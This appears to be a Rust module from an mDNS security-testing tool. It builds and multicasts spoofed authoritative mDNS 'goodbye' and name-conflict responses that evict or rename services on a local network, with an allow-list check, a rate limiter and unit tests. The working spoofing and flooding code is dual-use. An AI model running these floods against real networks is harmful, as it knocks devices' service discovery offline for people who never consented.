//! Disruptive mDNS flooding primitives.

use std::num::NonZeroU32;
use std::sync::Arc;

use governor::{Quota, RateLimiter};
use hickory_proto::op::{Message, MessageType, ResponseCode};
use hickory_proto::rr::rdata::{PTR, SRV, TXT};
use hickory_proto::rr::{DNSClass, Name, RData, Record};
use hickory_proto::serialize::binary::BinEncodable;

use crate::auth::Authorization;
use crate::error::{Error, Result};
use crate::mode::Mode;
use crate::transport::{Destination, Transport};

const DEFAULT_RATE_PPS: u32 = 50;

#[derive(Debug, Clone, Copy)]
pub struct FloodOptions {
    pub rate_pps: NonZeroU32,
}

impl Default for FloodOptions {
    fn default() -> Self {
        Self {
            rate_pps: NonZeroU32::new(DEFAULT_RATE_PPS).unwrap_or(NonZeroU32::MIN),
        }
    }
}

pub async fn goodbye(
    mode: Mode,
    targets: &[String],
    auth: &Authorization,
    opts: FloodOptions,
) -> Result<usize> {
    auth.warn_once_if_permissive("flood:goodbye");
    if !mode.sends_responses() {
        return Err(Error::InvalidServiceType(format!(
            "flood requires Authoritative or Custom mode, got {mode:?}"
        )));
    }
    let transport = Arc::new(Transport::build(mode)?);
    let limiter = limiter(opts.rate_pps);

    let mut sent = 0_usize;
    for fqdn in targets {
        if !auth.permits_instance(&strip_dot(fqdn)) {
            tracing::warn!(target = %fqdn, "blocked by allow-list");
            continue;
        }
        let bytes = build_goodbye(fqdn)?;
        limiter.until_ready().await;
        transport.send_query(&bytes, Destination::Multicast).await?;
        sent += 1;
    }
    Ok(sent)
}

pub async fn conflict_rename(
    mode: Mode,
    targets: &[String],
    auth: &Authorization,
    opts: FloodOptions,
) -> Result<usize> {
    auth.warn_once_if_permissive("flood:conflict");
    if !mode.sends_responses() {
        return Err(Error::InvalidServiceType(format!(
            "flood requires Authoritative or Custom mode, got {mode:?}"
        )));
    }
    let transport = Arc::new(Transport::build(mode)?);
    let limiter = limiter(opts.rate_pps);

    let mut sent = 0_usize;
    for fqdn in targets {
        if !auth.permits_instance(&strip_dot(fqdn)) {
            tracing::warn!(target = %fqdn, "blocked by allow-list");
            continue;
        }
        let bytes = build_conflict(fqdn)?;
        limiter.until_ready().await;
        transport.send_query(&bytes, Destination::Multicast).await?;
        sent += 1;
    }
    Ok(sent)
}

fn limiter(
    rate: NonZeroU32,
) -> Arc<
    RateLimiter<
        governor::state::NotKeyed,
        governor::state::InMemoryState,
        governor::clock::DefaultClock,
    >,
> {
    Arc::new(RateLimiter::direct(Quota::per_second(rate)))
}

fn build_goodbye(fqdn: &str) -> Result<Vec<u8>> {
    let name = Name::from_utf8(fqdn).map_err(|_| Error::InvalidServiceType(fqdn.to_string()))?;
    let mut msg = Message::new();
    msg.set_message_type(MessageType::Response)
        .set_authoritative(true)
        .set_response_code(ResponseCode::NoError);

    let mut ptr = Record::from_rdata(name.clone(), 0, RData::PTR(PTR(name.clone())));
    ptr.set_dns_class(DNSClass::IN);
    msg.add_answer(ptr);

    let srv_name = name.clone();
    let mut srv = Record::from_rdata(name.clone(), 0, RData::SRV(SRV::new(0, 0, 0, srv_name)));
    srv.set_dns_class(DNSClass::IN);
    msg.add_answer(srv);

    let mut txt = Record::from_rdata(name, 0, RData::TXT(TXT::new(Vec::new())));
    txt.set_dns_class(DNSClass::IN);
    msg.add_answer(txt);

    Ok(msg.to_bytes()?)
}

fn build_conflict(fqdn: &str) -> Result<Vec<u8>> {
    let name = Name::from_utf8(fqdn).map_err(|_| Error::InvalidServiceType(fqdn.to_string()))?;
    let mut msg = Message::new();
    msg.set_message_type(MessageType::Response)
        .set_authoritative(true)
        .set_response_code(ResponseCode::NoError);

    let conflict_target = Name::from_utf8("whodis-conflict.local.")
        .map_err(|_| Error::InvalidServiceType("whodis-conflict.local.".to_string()))?;
    let mut srv = Record::from_rdata(name, 120, RData::SRV(SRV::new(0, 0, 0, conflict_target)));
    srv.set_dns_class(DNSClass::IN);
    msg.add_answer(srv);

    Ok(msg.to_bytes()?)
}

fn strip_dot(s: &str) -> String {
    s.trim_end_matches('.').to_string()
}

#[cfg(test)]
mod tests {
    use hickory_proto::serialize::binary::BinDecodable;

    use super::*;

    #[test]
    fn build_goodbye_produces_three_records() {
        let bytes = build_goodbye("Foo._airplay._tcp.local.").expect("build");
        let msg = hickory_proto::op::Message::from_bytes(&bytes).expect("parse");
        assert_eq!(msg.answers().len(), 3);
        assert!(msg.authoritative());
        for r in msg.answers() {
            assert_eq!(r.ttl(), 0);
        }
    }

    #[test]
    fn build_conflict_uses_whodis_target() {
        let bytes = build_conflict("Foo._airplay._tcp.local.").expect("build");
        let msg = hickory_proto::op::Message::from_bytes(&bytes).expect("parse");
        let r = msg.answers().first().expect("answer");
        let is_srv_with_conflict = matches!(
            r.data(),
            Some(hickory_proto::rr::RData::SRV(srv)) if srv.target().to_string().contains("whodis-conflict")
        );
        assert!(
            is_srv_with_conflict,
            "expected SRV record with whodis-conflict target"
        );
    }

    #[tokio::test(start_paused = true)]
    async fn limiter_caps_rate() {
        let l = limiter(NonZeroU32::new(2).expect("rate"));
        l.until_ready().await;
        l.until_ready().await;
        let pending = tokio::spawn(async move { l.until_ready().await });
        tokio::time::advance(std::time::Duration::from_millis(400)).await;
        assert!(!pending.is_finished(), "limiter should still be holding");
        tokio::time::advance(std::time::Duration::from_millis(700)).await;
        let _joined = pending.await;
    }
}
